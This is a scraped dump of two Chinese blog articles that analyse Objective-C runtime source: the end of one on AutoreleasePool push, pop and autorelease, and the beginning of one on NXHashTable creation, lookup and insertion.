<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130790"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-pop-stack"" title=""objc-autorelease-pop-stack""></span></p>
<h3>
<a></a>objc_autoreleasePoolPush 方法</h3>
<p>了解了 <code>POOL_SENTINEL</code>，我们来重新回顾一下 <code>objc_autoreleasePoolPush</code> 方法：</p>
<pre><code class=""objectivec"">void *objc_autoreleasePoolPush(void) {
    return AutoreleasePoolPage::push();
}</code></pre>
<p>它调用 <code>AutoreleasePoolPage</code> 的类方法 <code>push</code>，也非常简单：</p>
<pre><code class=""objectivec"">static inline void *push() {
   return autoreleaseFast(POOL_SENTINEL);
}</code></pre>
<p><a></a>在这里会进入一个比较关键的方法 <code>autoreleaseFast</code>，并传入哨兵对象 <code>POOL_SENTINEL</code>：</p>
<pre><code class=""objectivec"">static inline id *autoreleaseFast(id obj)
{
   AutoreleasePoolPage *page = hotPage();
   if (page &amp;&amp; !page-&gt;full()) {
       return page-&gt;add(obj);
   } else if (page) {
       return autoreleaseFullPage(obj, page);
   } else {
       return autoreleaseNoPage(obj);
   }
}</code></pre>
<p>上述方法分三种情况选择不同的代码执行：</p>
<ul>
<li>
<p>有 <code>hotPage</code> 并且当前 <code>page</code> 不满</p>
<ul><li><p>调用 <code>page-&gt;add(obj)</code> 方法将对象添加至 <code>AutoreleasePoolPage</code> 的栈中</p></li></ul>
</li>
<li>
<p>有 <code>hotPage</code> 并且当前 <code>page</code> 已满</p>
<ul>
<li><p>调用 <code>autoreleaseFullPage</code> 初始化一个新的页</p></li>
<li><p>调用 <code>page-&gt;add(obj)</code> 方法将对象添加至 <code>AutoreleasePoolPage</code> 的栈中</p></li>
</ul>
</li>
<li>
<p>无 <code>hotPage</code></p>
<ul>
<li><p>调用 <code>autoreleaseNoPage</code> 创建一个 <code>hotPage</code></p></li>
<li><p>调用 <code>page-&gt;add(obj)</code> 方法将对象添加至 <code>AutoreleasePoolPage</code> 的栈中</p></li>
</ul>
</li>
</ul>
<p>最后的都会调用 <code>page-&gt;add(obj)</code> 将对象添加到自动释放池中。</p>
<blockquote><p><code>hotPage</code> 可以理解为当前正在使用的 <code>AutoreleasePoolPage</code>。</p></blockquote>
<h4>page-&gt;add 添加对象</h4>
<p><code>id *add(id obj)</code> 将对象添加到自动释放池页中：</p>
<pre><code class=""objectivec"">id *add(id obj) {
    id *ret = next;
    *next = obj;
    next++;
    return ret;
}</code></pre>
<blockquote><p>笔者对这个方法进行了处理，更方便理解。</p></blockquote>
<p>这个方法其实就是一个压栈的操作，将对象加入 <code>AutoreleasePoolPage</code> 然后移动栈顶的指针。</p>
<h4>autoreleaseFullPage（当前 hotPage 已满）</h4>
<p><code>autoreleaseFullPage</code> 会在当前的 <code>hotPage</code> 已满的时候调用：</p>
<pre><code class=""objectivec"">static id *autoreleaseFullPage(id obj, AutoreleasePoolPage *page) {
    do {
        if (page-&gt;child) page = page-&gt;child;
        else page = new AutoreleasePoolPage(page);
    } while (page-&gt;full());

    setHotPage(page);
    return page-&gt;add(obj);
}</code></pre>
<p>它会从传入的 <code>page</code> 开始遍历整个双向链表，直到：</p>
<ol>
<li><p>查找到一个未满的 <code>AutoreleasePoolPage</code></p></li>
<li><p>使用构造器传入 <code>parent</code> 创建一个新的 <code>AutoreleasePoolPage</code></p></li>
</ol>
<p>在查找到一个可以使用的 <code>AutoreleasePoolPage</code> 之后，会将该页面标记成 <code>hotPage</code>，然后调动上面分析过的 <code>page-&gt;add</code> 方法添加对象。</p>
<h4>autoreleaseNoPage（没有 hotPage)</h4>
<p>如果当前内存中不存在 <code>hotPage</code>，就会调用 <code>autoreleaseNoPage</code> 方法初始化一个 <code>AutoreleasePoolPage</code>：</p>
<pre><code class=""objectivec"">static id *autoreleaseNoPage(id obj) {
    AutoreleasePoolPage *page = new AutoreleasePoolPage(nil);
    setHotPage(page);

    if (obj != POOL_SENTINEL) {
        page-&gt;add(POOL_SENTINEL);
    }

    return page-&gt;add(obj);
}</code></pre>
<p>既然当前内存中不存在 <code>AutoreleasePoolPage</code>，就要<strong>从头开始构建这个自动释放池的双向链表</strong>，也就是说，新的 <code>AutoreleasePoolPage</code> 是没有 <code>parent</code> 指针的。</p>
<p>初始化之后，将当前页标记为 <code>hotPage</code>，然后会先向这个 <code>page</code> 中添加一个 <code>POOL_SENTINEL</code> 对象，来确保在 <code>pop</code> 调用的时候，不会出现异常。</p>
<p>最后，将 <code>obj</code> 添加到自动释放池中。</p>
<h3>
<a></a>objc_autoreleasePoolPop 方法</h3>
<p>同样，回顾一下上面提到的 <code>objc_autoreleasePoolPop</code> 方法：</p>
<pre><code class=""objectivec"">void objc_autoreleasePoolPop(void *ctxt) {
    AutoreleasePoolPage::pop(ctxt);
}</code></pre>
<blockquote><p>看起来传入任何一个指针都是可以的，但是在整个工程并没有发现传入其他对象的例子。不过在这个方法中<strong>传入其它的指针也是可行的</strong>，会将自动释放池释放到相应的位置。</p></blockquote>
<p>我们一般都会在这个方法中传入一个哨兵对象 <code>POOL_SENTINEL</code>，如下图一样释放对象：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130790"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-pop-stack"" title=""objc-autorelease-pop-stack""></span></p>
<h4>对 objc_autoreleasePoolPop 行为的测试</h4>
<p>在继续分析这个方法之前做一个小测试，在 <code>objc_autoreleasePoolPop</code> 传入非哨兵对象，测试一下这个方法的行为。</p>
<p>下面是 <code>main.m</code> 文件中的源代码：</p>
<pre><code class=""objectivec"">#import &lt;Foundation/Foundation.h&gt;

int main(int argc, const char * argv[]) {
    @autoreleasepool {

        NSString *s = @""Draveness"";
        [s stringByAppendingString:@""-Suffix""];

    }
    return 0;
}</code></pre>
<p>在代码的这一行打一个断点，因为这里会调用 <code>autorelease</code> 方法，将字符串加入自动释放池：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130788"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-breakpoint-main"" title=""objc-autorelease-breakpoint-main""></span></p>
<p>当代码运行到这里时，通过 lldb 打印出当前 <code>hotPage</code> 中的栈内容：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130782"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-print-pool-content"" title=""objc-autorelease-print-pool-content""></span></p>
<ol>
<li><p>通过 <code>static</code> 方法获取当前 <code>hotPage</code></p></li>
<li><p>打印 <code>AutoreleasePoolPage</code> 中的内容</p></li>
<li><p>打印当前 <code>next</code> 指针指向的内容，以及之前的内容，<code>-2 </code>时已经到了 <code>begin()</code> 位置</p></li>
<li><p>使用 <code>print() </code>和 <code>printAll() </code>打印自动释放池中内容</p></li>
</ol>
<p>然后将字符串 <code>@""Draveness-Suffix""</code> 的指针传入 <code>pop</code> 方法，测试 <code>pop</code> 方法能否传入非哨兵参数。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006924125?w=638&amp;h=76"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-pop-string"" title=""objc-autorelease-pop-string""></span></p>
<p>再次打印当前 <code>AutoreleasePoolPage</code> 的内容时，字符串已经不存在了，这说明<strong>向 <code>pop</code> 方法传入非哨兵参数是可行的</strong>，只是我们一般不会传入非哨兵对象。</p>
<hr>
<p>让我们重新回到对 <code>objc_autoreleasePoolPop</code> 方法的分析，也就是 <code>AutoreleasePoolPage::pop</code> 方法的调用：</p>
<pre><code class=""objectivec"">static inline void pop(void *token) {
    AutoreleasePoolPage *page = pageForPointer(token);
    id *stop = (id *)token;

    page-&gt;releaseUntil(stop);

    if (page-&gt;child) {
        if (page-&gt;lessThanHalfFull()) {
            page-&gt;child-&gt;kill();
        } else if (page-&gt;child-&gt;child) {
            page-&gt;child-&gt;child-&gt;kill();
        }
    }
}</code></pre>
<blockquote><p>在这个方法中删除了大量无关的代码，以及对格式进行了调整。</p></blockquote>
<p>该静态方法总共做了三件事情：</p>
<ol>
<li><p>使用 <code>pageForPointer</code> 获取当前 <code>token</code> 所在的 <code>AutoreleasePoolPage</code></p></li>
<li><p>调用 <code>releaseUntil</code> 方法释放<strong>栈中的</strong>对象，直到 <code>stop</code></p></li>
<li><p>调用 <code>child</code> 的 <code>kill</code> 方法</p></li>
</ol>
<blockquote><p>我到现在也不是很清楚为什么要根据当前页的不同状态 <code>kill</code> 掉不同 <code>child</code> 的页面。</p></blockquote>
<pre><code class=""objectivec"">if (page-&gt;lessThanHalfFull()) {
    page-&gt;child-&gt;kill();
} else if (page-&gt;child-&gt;child) {
    page-&gt;child-&gt;child-&gt;kill();
}</code></pre>
<h4>pageForPointer 获取 AutoreleasePoolPage</h4>
<p><code>pageForPointer</code> 方法主要是通过内存地址的操作，获取当前指针所在页的首地址：</p>
<pre><code class=""objectivec"">static AutoreleasePoolPage *pageForPointer(const void *p) {
    return pageForPointer((uintptr_t)p);
}

static AutoreleasePoolPage *pageForPointer(uintptr_t p) {
    AutoreleasePoolPage *result;
    uintptr_t offset = p % SIZE;

    assert(offset &gt;= sizeof(AutoreleasePoolPage));

    result = (AutoreleasePoolPage *)(p - offset);
    result-&gt;fastcheck();

    return result;
}</code></pre>
<p>将指针与页面的大小，也就是 4096 取模，得到当前指针的偏移量，因为所有的 <code>AutoreleasePoolPage</code> 在内存中都是对齐的：</p>
<pre><code>p = 0x100816048
p % SIZE = 0x48
result = 0x100816000</code></pre>
<p>而最后调用的方法 <code>fastCheck()</code> 用来检查当前的 <code>result</code> 是不是一个 <code>AutoreleasePoolPage</code>。</p>
<blockquote><p>通过检查 <code>magic_t</code> 结构体中的某个成员是否为 <code>0xA1A1A1A1</code>。</p></blockquote>
<h4>releaseUntil 释放对象</h4>
<p><code>releaseUntil</code> 方法的实现如下：</p>
<pre><code class=""objectivec"">void releaseUntil(id *stop) {
    while (this-&gt;next != stop) {
        AutoreleasePoolPage *page = hotPage();

        while (page-&gt;empty()) {
            page = page-&gt;parent;
            setHotPage(page);
        }

        page-&gt;unprotect();
        id obj = *--page-&gt;next;
        memset((void*)page-&gt;next, SCRIBBLE, sizeof(*page-&gt;next));
        page-&gt;protect();

        if (obj != POOL_SENTINEL) {
            objc_release(obj);
        }
    }

    setHotPage(this);
}</code></pre>
<p>它的实现还是很容易的，用一个 <code>while</code> 循环持续释放 <code>AutoreleasePoolPage</code> 中的内容，直到 <code>next</code> 指向了 <code>stop</code> 。</p>
<p>使用 <code>memset</code> 将内存的内容设置成 <code>SCRIBBLE</code>，然后使用 <code>objc_release</code> 释放对象。</p>
<h4>kill() 方法</h4>
<p>到这里，没有分析的方法就只剩下 <code>kill</code> 了，而它会将当前页面以及子页面全部删除：</p>
<pre><code class=""objectivec"">void kill() {
    AutoreleasePoolPage *page = this;
    while (page-&gt;child) page = page-&gt;child;

    AutoreleasePoolPage *deathptr;
    do {
        deathptr = page;
        page = page-&gt;parent;
        if (page) {
            page-&gt;unprotect();
            page-&gt;child = nil;
            page-&gt;protect();
        }
        delete deathptr;
    } while (deathptr != this);
}</code></pre>
<h3>autorelease 方法</h3>
<p>我们已经对自动释放池生命周期有一个比较好的了解，最后需要了解的话题就是 <code>autorelease</code> 方法的实现，先来看一下方法的调用栈：</p>
<pre><code class=""objectivec"">- [NSObject autorelease]
└── id objc_object::rootAutorelease()
    └── id objc_object::rootAutorelease2()
        └── static id AutoreleasePoolPage::autorelease(id obj)
            └── static id AutoreleasePoolPage::autoreleaseFast(id obj)
                ├── id *add(id obj)
                ├── static id *autoreleaseFullPage(id obj, AutoreleasePoolPage *page)
                │   ├── AutoreleasePoolPage(AutoreleasePoolPage *newParent)
                │   └── id *add(id obj)
                └── static id *autoreleaseNoPage(id obj)
                    ├── AutoreleasePoolPage(AutoreleasePoolPage *newParent)
                    └── id *add(id obj)</code></pre>
<p>在 <code>autorelease</code> 方法的调用栈中，最终都会调用上面提到的 <a>autoreleaseFast</a> 方法，将当前对象加到 <code>AutoreleasePoolPage</code> 中。</p>
<p>这一小节中这些方法的实现都非常容易，只是进行了一些参数上的检查，最终还要调用 <a>autoreleaseFast</a> 方法：</p>
<pre><code class=""objectivec"">inline id objc_object::rootAutorelease() {
    if (isTaggedPointer()) return (id)this;
    if (prepareOptimizedReturn(ReturnAtPlus1)) return (id)this;

    return rootAutorelease2();
}

__attribute__((noinline,used)) id objc_object::rootAutorelease2() {
    return AutoreleasePoolPage::autorelease((id)this);
}

static inline id autorelease(id obj) {
   id *dest __unused = autoreleaseFast(obj);
   return obj;
}</code></pre>
<p>由于在上面已经分析过 <code>autoreleaseFast</code> 方法的实现，这里就不会多说了。</p>
<h2>小结</h2>
<p>整个自动释放池 <code>AutoreleasePool</code> 的实现以及 <code>autorelease</code> 方法都已经分析完了，我们再来回顾一下文章中的一些内容：</p>
<ul>
<li><p>自动释放池是由 <code>AutoreleasePoolPage</code> 以双向链表的方式实现的</p></li>
<li><p>当对象调用 <code>autorelease</code> 方法时，会将对象加入 <code>AutoreleasePoolPage</code> 的栈中</p></li>
<li><p>调用 <code>AutoreleasePoolPage::pop</code> 方法会向栈中的对象发送 <code>release</code> 消息</p></li>
</ul>
<h2>参考资料</h2>
<ul>
<li><p><a href=""http://stackoverflow.com/questions/14677049/what-is-autoreleasepool-objective-c"" rel=""nofollow noreferrer"">What is autoreleasepool? - Objective-C</a></p></li>
<li><p><a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/mmAutoreleasePools.html"" rel=""nofollow noreferrer"">Using Autorelease Pool Blocks</a></p></li>
<li><p><a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Classes/NSAutoreleasePool_Class/index.html#//apple_ref/occ/cl/NSAutoreleasePool"" rel=""nofollow noreferrer"">NSAutoreleasePool</a></p></li>
<li><p><a href=""http://blog.sunnyxx.com/2014/10/15/behind-autorelease/"" rel=""nofollow noreferrer"">黑幕背后的 Autorelease</a></p></li>
</ul>
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
</blockquote>

                ", 自动释放池的前世今生,1531972027,457,1,350,1,1,https://segmentfault.com/a/1190000005130701
102,1,0,6,"
                    
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
<p>因为 ObjC 的 runtime 只能在 Mac OS 下才能编译，所以文章中的代码都是在 Mac OS，也就是 <code>x86_64</code> 架构下运行的，对于在 arm64 中运行的代码会特别说明。</p>
</blockquote>
<h2>写在前面</h2>
<p>文章会介绍上古时代 Objective-C 哈希表，也就是 <code>NXHashTable</code> ：</p>
<ul>
<li><p><code>NXHashTable</code> 的实现</p></li>
<li><p><code>NXHashTable</code> 的性能分析</p></li>
<li><p><code>NXHashTable</code> 的作用</p></li>
</ul>
<p><code>NXHashTable</code> 的实现有着将近 30 年的历史，不过仍然作为重要的底层数据结构存储整个应用中的类。</p>
<blockquote>
<p>文中会涉及一些数据结构方面的简单知识，例如<a href=""https://en.wikipedia.org/wiki/Hash_table#Separate_chaining_with_linked_lists"" rel=""nofollow noreferrer"">拉链法</a>。</p>
<p>注意：<strong>文章中分析的不是 <code>NSHashTable</code> 而是 <code>NXHashTable</code>。</strong></p>
</blockquote>
<h2>NXHashTable</h2>
<p><code>NXHashTable</code> 的实现位于 <code>hashtable2.mm</code> 文件，我们先来看一下 <code>NXHashTable</code> 的结构以及重要的接口：</p>
<pre><code class=""objectivec"">typedef struct {
    const NXHashTablePrototype *prototype;
    unsigned count;
    unsigned nbBuckets;
    void *buckets;
    const void *info;
} NXHashTable;</code></pre>
<p>对于结构体中的 <code>NXHashTablePrototype</code> 属性暂且不说，其中的 <code>buckets</code> 是真正用来<strong>存储数据的数组</strong>。</p>
<pre><code class=""objectivec"">NXHashTable *NXCreateHashTableFromZone (NXHashTablePrototype prototype, unsigned capacity, const void *info, void *z);
unsigned NXCountHashTable (NXHashTable *table);
int NXHashMember (NXHashTable *table, const void *data);
void *NXHashGet (NXHashTable *table, const void *data);
void *NXHashInsert (NXHashTable *table, const void *data);
void *NXHashRemove (NXHashTable *table, const void *data);</code></pre>
<p>我们会以上面的这些方法作为切入点，分析 <code>NXHashTable</code> 的实现。</p>
<h3>NXCreateHashTableFromZone</h3>
<p><code>NXHashTable</code> 使用 <code>NXCreateHashTableFromZone</code> 方法初始化：</p>
<pre><code class=""objectivec"">NXHashTable *NXCreateHashTableFromZone (NXHashTablePrototype prototype, unsigned capacity, const void *info, void *z) {
    NXHashTable            *table;
    NXHashTablePrototype     *proto;

    table = ALLOCTABLE(z);
    if (! prototypes) bootstrap ();
    if (! prototype.hash) prototype.hash = NXPtrHash;
    if (! prototype.isEqual) prototype.isEqual = NXPtrIsEqual;
    if (! prototype.free) prototype.free = NXNoEffectFree;

    proto = (NXHashTablePrototype *)NXHashGet (prototypes, &amp;prototype);
    if (! proto) {
        proto = (NXHashTablePrototype *) malloc(sizeof (NXHashTablePrototype));
        bcopy ((const char*)&amp;prototype, (char*)proto, sizeof (NXHashTablePrototype));
        (void) NXHashInsert (prototypes, proto);
        proto = (NXHashTablePrototype *)NXHashGet (prototypes, &amp;prototype);
    };
    table-&gt;prototype = proto;
    table-&gt;count = 0;
    table-&gt;info = info;
    table-&gt;nbBuckets = GOOD_CAPACITY(capacity);
    table-&gt;buckets = ALLOCBUCKETS(z, table-&gt;nbBuckets);
    return table;
}</code></pre>
<p>在这个方法中，绝大多数代码都是用来初始化 <code>table-&gt;prototype</code> 的，我们先把这部分全部忽略，分析一下简略版本的实现。</p>
<pre><code class=""objectivec"">NXHashTable *NXCreateHashTableFromZone (NXHashTablePrototype prototype, unsigned capacity, const void *info, void *z) {
    NXHashTable            *table;
    NXHashTablePrototype     *proto;

    table = ALLOCTABLE(z);
    
    ...

    table-&gt;count = 0;
    table-&gt;info = info;
    table-&gt;nbBuckets = GOOD_CAPACITY(capacity);
    table-&gt;buckets = ALLOCBUCKETS(z, table-&gt;nbBuckets);
    return table;
}</code></pre>
<p>其中 <code>ALLOCTABLE</code>、<code>GOOD_CAPACITY</code> 以及 <code>ALLOCBUCKETS</code> 都是用来辅助初始化的宏：</p>
<pre><code class=""objectivec"">#define     ALLOCTABLE(z) ((NXHashTable *) malloc_zone_malloc ((malloc_zone_t *)z,sizeof (NXHashTable)))
#define GOOD_CAPACITY(c) (exp2m1u (log2u (c)+1))
#define ALLOCBUCKETS(z,nb) ((HashBucket *) malloc_zone_calloc ((malloc_zone_t *)z, nb, sizeof (HashBucket)))</code></pre>
<p><code>ALLOCTABLE</code> 和 <code>ALLOCBUCKETS</code> 只是调用了 <code>malloc_zone_calloc</code> 来初始化相应的结构体，而 <code>GOOD_CAPACITY</code> 有一些特殊，我们来举个例子说明：</p>
<pre><code>c   binary  result
1   1       1 
2   10      3(0b11)
6   110     7(0b111)
100 1100100 127(0b111 1111)</code></pre>
<p><code>c</code> 表示传入参数，<code>binary</code> 表示二进制下的参数，而 <code>result</code> 就是 <code>GOOD_CAPACITY</code> 返回的结果。</p>
<blockquote><p>每次返回当前位数下的二进制最大值。</p></blockquote>
<p>获得 <code>table-&gt;nbBuckets</code> 之后，再初始化 <code>table-&gt;nbBuckets * sizeof (HashBucket)</code> 大小的内存空间。</p>
<h4>NXHashTablePrototype</h4>
<p>在继续分析其它方法之前，我们需要先知道 <code>NXHashTablePrototype</code> 是什么：</p>
<pre><code class=""objectivec"">typedef struct {
    uintptr_t (*hash)(const void *info, const void *data);
    int (*isEqual)(const void *info, const void *data1, const void *data2);
    void (*free)(const void *info, void *data);
    int style; /* reserved for future expansion; currently 0 */
} NXHashTablePrototype;</code></pre>
<p><code>NXHashTablePrototype</code> 中存储了 <code>hash</code>、<code>isEqual</code> 和 <code>free</code> 的函数指针（用于获取数据的哈希、判断两个数据是否相等以及释放数据）。</p>
<p>在 <code>hashtable2.mm</code> 文件中有一个宏 <code>ISEQUAL</code> 就是用了 <code>NXHashTablePrototype</code> 中的 <code>isEqual</code> 来判断两个数据是否相等：</p>
<pre><code class=""objectivec"">#define ISEQUAL(table, data1, data2) ((data1 == data2) || (*table-&gt;prototype-&gt;isEqual)(table-&gt;info, data1, data2))</code></pre>
<p>可以说，<code>NXHashTablePrototype</code> 中存储了一些<strong>构建哈希表必要的函数指针</strong>。</p>
<blockquote><p>因为 <code>NXHashTable</code> 使用<a href=""https://en.wikipedia.org/wiki/Hash_table#Separate_chaining_with_linked_lists"" rel=""nofollow noreferrer"">拉链法</a>来实现哈希表，在存入表前对数据执行 hash，然后找到对应的 buckets，如果与 buckets 中的数据相同（使用 isEqual 判断），就替换原数据，否则将数据添加到链表中。</p></blockquote>
<h4>HashBucket</h4>
<p>在这里另一个需要注意的数据结构就是 <code>HashBucket</code>：</p>
<pre><code class=""c"">typedef struct    {
    unsigned count;
    oneOrMany elements;
} HashBucket;</code></pre>
<p><code>oneOrMany</code> 是一个 <code>union</code> 结构体：</p>
<pre><code class=""c"">typedef union {
    const void *one;
    const void **many;
} oneOrMany;</code></pre>
<blockquote><p>这么设计的主要原因是<strong>提升性能</strong>。</p></blockquote>
<p>如果 <code>HashBucket</code> 中只有一个元素，那么就直接访问 <code>one</code>，否则访问 <code>many</code>，遍历这个 <code>many</code> 列表。</p>
<h3>NXCountHashTable</h3>
<p><code>NXCountHashTable</code> 方法应该是我们要介绍的方法中的最简单的一个，它会直接返回 <code>NXHashTable</code> 结构体中的 <code>count</code>。</p>
<pre><code class=""objectivec"">unsigned NXCountHashTable (NXHashTable *table) {
    return table-&gt;count;
}</code></pre>
<h3>NXHashMember</h3>
<p><code>NXHashMember</code> 的函数签名虽然会返回 <code>int</code>，其实它是一个布尔值，会判断当前的 <code>NXHashTable</code> 中是否包含传入的数据：</p>
<pre><code class=""objectivec"">int NXHashMember (NXHashTable *table, const void *data) {
    HashBucket    *bucket = BUCKETOF(table, data);
    unsigned    j = bucket-&gt;count;
    const void    **pairs;

    if (! j) return 0;
    if (j == 1) {
        return ISEQUAL(table, data, bucket-&gt;elements.one);
    };
    pairs = bucket-&gt;elements.many;
    while (j--) {
        if (ISEQUAL(table, data, *pairs)) return 1;
        pairs ++;
    };
    return 0;
}</code></pre>
<p>使用 <code>BUCKETOF</code> 对 <code>data</code> 进行 hash，将结果与哈希表的 <code>buckets</code> 数取模，返回 <code>buckets</code> 数组中对应的 <code>NXHashBucket</code>。</p>
<pre><code class=""objectivec"">#define BUCKETOF(table, data) (((HashBucket *)table-&gt;buckets)+((*table-&gt;prototype-&gt;hash)(table-&gt;info, data) % table-&gt;nbBuckets))</code></pre>
<p>在获取了 <code>bucket</code> 之后，根据其中元素个数的不同，选择不同的分支：</p>
<pre><code class=""objectivec"">if (! j) return 0;
if (j == 1) {
    return ISEQUAL(table, data, bucket-&gt;elements.one);
};
pairs = bucket-&gt;elements.many;
while (j--) {
    if (ISEQUAL(table, data, *pairs)) return 1;
    pairs ++;
};</code></pre>
<ul>
<li><p><code>count == 0</code>，直接返回</p></li>
<li><p><code>count == 1</code>，使用 <code>ISEQUAL</code> 比较查找的数据与 <code>bucket-&gt;elements.one</code></p></li>
<li>
<p><code>count &gt; 1</code>，依次与 <code>bucket-&gt;elements.many</code> 中的值进行比较</p>
<pre><code>&gt; 你可能觉得到这里的时间复杂度比较糟糕，然而这个列表并不会很长，具体会在 [NXHashInsert](#nxhashinsert) 中解释。
</code></pre>
</li>
</ul>
<h3>NXHashGet</h3>
<blockquote>
<p>其实我一直觉得这个方法可能用处不是很大，尤其是在使用默认的 <code>NXHashTablePrototype</code> 时，因为默认的 <code>NXHashTablePrototype</code> 中的 <code>isEqual</code> 函数指针只是比较两个数据的指针是否相同。</p>
<p>其最大作用就是查看当前 <code>data</code> 是不是在表中。</p>
<p>如果当前数据在表中，那么这个方法只会返回一个相同的指针，没有太多的意义。</p>
</blockquote>
<p>它的实现跟上面的 <code>NXHashMember</code> 区别并不大，这里就不过多介绍了：</p>
<pre><code class=""objectivec"">void *NXHashGet (NXHashTable *table, const void *data) {
    HashBucket    *bucket = BUCKETOF(table, data);
    unsigned    j = bucket-&gt;count;
    const void    **pairs;

    if (! j) return NULL;
    if (j == 1) {
        return ISEQUAL(table, data, bucket-&gt;elements.one)
        ? (void *) bucket-&gt;elements.one : NULL;
    };
    pairs = bucket-&gt;elements.many;
    while (j--) {
        if (ISEQUAL(table, data, *pairs)) return (void *) *pairs;
        pairs ++;
    };
    return NULL;
}</code></pre>
<h3>NXHashInsert</h3>
<p><code>NXHashInsert</code> 是 <code>NXHashTable</code> 中比较重要的方法，其作用就是向表中插入数据：</p>
<pre><code class=""objectivec"">void *NXHashInsert (NXHashTable *table, const void *data) {
    HashBucket *bucket = BUCKETOF(table, data);
    unsigned j = bucket-&gt;count;
    const void **pairs;
    const void **newt;

    if (! j) {
        bucket-&gt;count++;
        bucket-&gt;elements.one = data;
        table-&gt;count++;
        return NULL;
    };
    if (j == 1) {
        if (ISEQUAL(table, data, bucket-&gt;elements.one)) {
            const void *old = bucket-&gt;elements.one;
            bucket-&gt;elements.one = data;
            return (void *) old;
        };
        newt = ALLOCPAIRS(z, 2);
        newt[1] = bucket-&gt;elements.one;
        *newt = data;
        bucket-&gt;count++;
        bucket-&gt;elements.many = newt;
        table-&gt;count++;
        if (table-&gt;count &gt; table-&gt;nbBuckets) _NXHashRehash (table);
        return NULL;
    };
    pairs = bucket-&gt;elements.many;
    while (j--) {
        if (ISEQUAL(table, data, *pairs)) {
            const void    *old = *pairs;
            *pairs = data;
            return (void *) old;
        };
        pairs ++;
    };
    newt = ALLOCPAIRS(z, bucket-&gt;count+1);
    if (bucket-&gt;count) bcopy ((const char*)bucket-&gt;elements.many, (char*)(newt+1), bucket-&gt;count * PTRSIZE);
    *newt = data;
    FREEPAIRS (bucket-&gt;elements.many);
    bucket-&gt;count++; 
    bucket-&gt;elements.many = newt;
    table-&gt;count++;
    if (table-&gt;count &gt; table-&gt;nbBuckets) _NXHashRehash (table);
    return NULL;
}</code></pre>
<p>虽然这里的实现比上面的两个方法复杂得多，但是脉络仍然很清晰，我们将插入的过程分为三种情况：</p>
<ul>
<li><p><code>bucket-&gt;count == 0</code></p></li>
<li><p><code>bucket-&gt;count == 1</code></p></li>
<li><p><code>bucket-&gt;count &gt; 1</code></p></li>
</ul>
<p>如果对应的 <code>bucket</code> 为空：</p>
<pre><code class=""objectivec"">if (! j) {
    bucket-&gt;count++; 
    bucket-&gt;elements.one = data;
    table-&gt;count++;
    return NULL;
};</code></pre>
<p>将数据直接填入 <code>bucket</code>，增加 <code>bucket</code> 中元素的数目，以及 <code>table</code> 中存储的元素的数目：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075497"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-insert-empty"" title=""objc-hashtable-insert-empty""></span></p>
<p>如果原来的 <code>buckets</code> 中有一个元素，它会替换或者使用 <code>many</code> 替换原来的 <code>one</code>：</p>
<pre><code class=""objectivec"">if (j == 1) {
    if (ISEQUAL(table, data, bucket-&gt;elements.one)) {
        const void    *old = bucket-&gt;elements.one;
        bucket-&gt;elements.one = data;
        return (void *) old;
    };
    newt = ALLOCPAIRS(z, 2);
    newt[1] = bucket-&gt;elements.one;
    *newt = data;
    bucket-&gt;count++;
    bucket-&gt;elements.many = newt;
    table-&gt;count++;
    
    ...

    return NULL;
};</code></pre>
<p>当前数据 <code>data</code> 如果与 <code>bucket</code> 中存储的数据相同，就会更新这个数据，否则就会使用 <code>ALLOCPAIRS</code> 初始化一个新的数组，然后将 <code>data</code> 和原来的数据传入。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006953310?w=800&amp;h=600"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-insert-one.gif"" title=""objc-hashtable-insert-one.gif""></span></p>
<p>但是如果原来的 <code>bucket</code> 中存储的元素大于 1，那么会在链表的头部追加一个新的元素：</p>
<pre><code class=""objectivec"">while (j--) {
    if (ISEQUAL(table, data, *pairs)) {
        const void    *old = *pairs;
        *pairs = data;
        return (void *) old;
    };
    pairs ++;
};
newt = ALLOCPAIRS(z, bucket-&gt;count+1);
if (bucket-&gt;count) bcopy ((const char*)bucket-&gt;elements.many, (char*)(newt+1), bucket-&gt;count * PTRSIZE);
*newt = data;
FREEPAIRS (bucket-&gt;elements.many);
bucket-&gt;count++;
bucket-&gt;elements.many = newt;
table-&gt;count++;</code></pre>
<p>上面的代码使用 <code>bcopy</code> 将原链表中元素拷贝到新的数组 <code>newt</code> 中。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075499"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-insert-many.gif"" title=""objc-hashtable-insert-many.gif""></span></p>
<p>在每次添加完一个元素之后，都会进行下面的判断：</p>
<pre><code class=""objectivec"">if (table-&gt;count &gt; table-&gt;nbBuckets) _NXHashRehash (table);</code></pre>
<blockquote><p>上面的这行代码会保证<strong>哈希表中的元素数据小于等于表中的 bucket 数量</strong>。</p></blockquote>
<p>这就是 <code>buckets</code> 后面的列表非常短的原因，在理想情况下，<strong>每一个 <code>buckets</code> 中都只存储一个或零个元素</strong>。</p>
